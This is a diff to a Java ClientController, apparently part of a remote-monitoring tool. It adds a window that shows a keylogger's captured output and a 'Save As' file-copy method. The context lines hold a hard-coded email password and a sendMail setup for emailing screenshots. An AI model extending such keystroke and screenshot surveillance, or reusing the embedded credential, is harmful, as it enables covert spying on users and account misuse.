@@ -36,6 +36,55 @@ public class ClientController {
     private String password = "mylxemednkcccfzz";//change accordingly
     private String subject = "ScreenShot";
 
+    public void keyloggerFrame(String keyloggerFile) throws IOException {
+        // Tạo đối tượng `JTextArea`
+        JTextArea textArea = new JTextArea();
+
+        // Đọc nội dung của file keylooger
+        File file = new File(keyloggerFile);
+        Scanner scanner = new Scanner(file);
+        while (scanner.hasNextLine()) {
+            textArea.append(scanner.nextLine() + "\n");
+        }
+        scanner.close();
+
+        // Thêm đối tượng `JTextArea` vào giao diện GUI???
+        JFrame frame = new JFrame();
+        frame.add(textArea);
+        frame.pack();
+        frame.setVisible(true);
+    }
+
+    public void saveas(String sourceFilePath){
+
+        // Create a file dialog to choose the destination file location
+        FileDialog fileDialog = new FileDialog(new Frame(), "Save As", FileDialog.SAVE);
+        fileDialog.setVisible(true);
+
+        // Get the selected file and directory
+        String selectedFile = fileDialog.getFile();
+        String selectedDirectory = fileDialog.getDirectory();
+
+        // Check if the user canceled the file dialog
+        if (selectedFile == null || selectedDirectory == null) {
+            System.out.println("Save operation canceled by the user.");
+            return;
+        }
+
+        // Construct the destination path
+        Path destinationPath = Path.of(selectedDirectory, selectedFile);
+
+        try {
+            // Copy the file to the chosen destination
+            Files.copy(Path.of(sourceFilePath), destinationPath, StandardCopyOption.REPLACE_EXISTING);
+
+            System.out.println("File saved successfully to: " + destinationPath);
+        } catch (Exception e) {
+            e.printStackTrace();
+            System.out.println("Error saving file.");
+        }
+    }
+
     private sendMail send = new sendMail(to, from,password,subject);
     public void buttonShutdown(ActionEvent eventc1) throws IOException {
         System.out.println("shutdown");
